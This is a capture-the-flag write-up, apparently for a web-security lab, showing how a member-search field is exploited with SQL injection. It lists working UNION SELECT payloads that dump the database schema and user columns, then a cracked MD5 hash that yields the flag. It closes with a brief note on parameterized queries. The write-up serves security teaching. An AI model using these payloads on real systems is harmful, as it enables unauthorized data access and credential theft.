# [SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## WriteUp
On the `member` page, there is a prompt that allows us to search for a user within the database by specifying their ID. Entering a number between 1 and 4 displays the first and last name of the user on the webpage.

Checking for Sql injections, we can pass the prompt `1 OR 1 = 1`. This causes all members to be displayed, meaning we can preform SQL Injections on the database. To gather data on the all the tables within the database and their columns, let use the prompt `1 OR 1 = 1 UNION SELECT table_name,column_name FROM information_schema.columns`.

This causes the webapp to render out all tables within the database and their colums, here is a simplified view:
``` ts
db = {
	"db_default": {
		"id": number,
		"username": string,
		"password": string,
	},
	"users": { // members
		"user_id": number,
		"first_name": string,
		"last_name": string,
		"town": string,
		"country": string,
		"planet": string,
		"Commentaire": string, 
		"coubtersign": string, // md5 hash
	},
	"guestbook": { //
		"id_comment": number,
		"comment": string,
		"name": string,
	},
	"list_images": { // Images
		"id": number,
		"url": string,
		"title": string,
		"comment": string,
	},
	"vote_dbs": {
		"vote": any, // I have no idea
		"nb_vote": number,
		"subject": string,
	},
}
```

Using `1 UNION SELECT first_name,%colunm% FROM users`, where `%column%` is a column in `users`, we can leak all the colunms for each user in `users`. We get the folowing user that looks interesting:
``` json
{
  "users": { // members
    "user_id": 4,
	"first_name": "Flag",
	"last_name": "Get The",
	// ...
	"Commentaire": "Decrypt this password -> then lower all the char. Sh256 on it and it's good !", 
	"coubtersign": "5ff9d0165b4f92b14994e5c685cdce28", // md5 hash
  },
}
```

Decripting the password with an [MD5 decryptor](https://md5decrypt.net/en/#answer), we get the password `FortyTwo`, getting the Sha256 of `fortytwo` nets us the flag.

## Possible Patches
Sanitizing your input and parameterizing your input is the best way to prevent sql injections. By removing/encoding dangerous characters you can prevent injections from happening.